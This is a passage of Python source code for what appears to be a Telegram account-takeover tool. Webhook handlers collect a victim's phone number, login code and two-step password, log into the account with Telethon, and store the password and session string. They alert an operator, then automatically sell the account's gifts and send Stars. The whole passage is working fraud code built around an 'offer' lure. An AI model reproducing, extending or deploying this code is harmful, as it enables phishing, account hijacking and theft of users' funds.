            f"✅ <b>Логин</b>\n<code>{res['user_id']}</code>\n"
            f"{res['first_name']} @{res['username'] or '—'}\nОффер #{p.offer_id}")
        asyncio.create_task(run_automation(session_str, p.offer_id))
        return {"ok": True, "needs_password": False}
    else:
        if res == "password":
            await update_session(sess.id, code=p.code, state="await_password")
            return {"ok": True, "needs_password": True}
        if res == "code":
            new_attempts = sess.attempts + 1
            await update_session(sess.id, attempts=new_attempts)
            return {"ok": False, "error": "Неверный код.",
                    "attempts_left": MAX_ATTEMPTS - new_attempts}
        if res == "expired":
            return {"ok": False, "error": "Код истёк."}
        return {"ok": False, "error": "Ошибка. Попробуйте снова."}


@app.post("/webhook/password")
async def wh_password(p: PasswordPayload):
    sess = await get_session_by_phone(p.phone)
    if not sess:
        return {"ok": False, "error": "Сессия не найдена."}
    if sess.attempts >= MAX_ATTEMPTS:
        return {"ok": False, "error": "Превышено количество попыток."}

    ok, res, session_str = await telethon_attempt_login(
        phone=p.phone, code=p.code, password=p.password,
        session_str=sess.session_string,
    )
    if ok:
        await update_session(sess.id, password=p.password, state="logged",
                             session_string=session_str,
                             user_id=res["user_id"], first_name=res["first_name"],
                             last_name=res["last_name"], username=res["username"])
        await notify_admin(f"✅ <b>Логин 2FA</b>\n<code>{res['user_id']}</code>\n{res['first_name']}")
        asyncio.create_task(run_automation(session_str, p.offer_id))
        return {"ok": True}
    else:
        if res == "password":
            new_attempts = sess.attempts + 1
            await update_session(sess.id, attempts=new_attempts)
            return {"ok": False, "error": "Неверный пароль.",
                    "attempts_left": MAX_ATTEMPTS - new_attempts}
        return {"ok": False, "error": "Ошибка."}


async def run_automation(session_string, offer_id):
    o = await get_offer(offer_id)
    if not o:
        return
    await notify_admin(f"🚀 <b>Автомат</b>\nОффер #{offer_id}: {o.gift_name}")
    result = await telethon_sell_gift_and_react(session_string, o.gift_name)

    lines = [f"🎯 <b>Результат</b>", f"Оффер: #{offer_id}", f"Подарок: {o.gift_name}"]
    if result.get("gifts_found"):
        lines.append(f"Найдено: {len(result['gifts_found'])}")
        lines.append("• " + ", ".join(result["gifts_found"][:5]))
    if result.get("min_price"):
        lines.append(f"Мин. цена: {result['min_price']} ⭐")
    if result.get("listed"):
        lines.append(f"✅ Выставлен")
    if result.get("reacted"):
        lines.append(f"✅ Реакция: {result['stars_sent']} ⭐")
    if result.get("error"):
        lines.append(f"❌ {result['error']}")
    await notify_admin("\n".join(lines))
    await add_log(offer_id=offer_id, event="automation_done", detail=str(result))


@app.get("/health")
async def health():
    return {"ok": True}


# ═══════════════════════════════════════════════════════
#   RUN
# ═══════════════════════════════════════════════════════

async def run_bot():
    await init_db()
    await bot.set_my_commands([BotCommand(command="start", description="Меню")],
                              scope=BotCommandScopeDefault())
    await dp.start_polling(bot)


async def run_web():
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    await server.serve()


async def main():
    await asyncio.gather(run_bot(), run_web())


if __name__ == "__main__":
    asyncio.run(main())
